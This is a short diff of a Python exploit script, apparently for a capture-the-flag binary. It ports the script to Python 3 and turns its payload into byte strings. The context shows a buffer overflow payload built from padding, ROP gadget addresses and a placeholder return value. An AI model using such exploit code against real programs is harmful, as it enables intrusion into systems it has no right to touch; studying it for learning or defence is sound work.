@@ -1,4 +1,4 @@
-#!/usr/bin/python
+#!/usr/bin/python3
 # coding: utf-8
 
 
@@ -29,9 +29,9 @@ pop_ret = 	0x0804901e
 pop_pop_ret = 	0x080493f9
 
 
-p = ''
-p += 'A' * 500
-p += 'B' * 16
+p = b''
+p += b'A' * 500
+p += b'B' * 16
 p += p32(add_bin)
 p += p32(pop_ret)
 p += p32(0xdeadbeef)
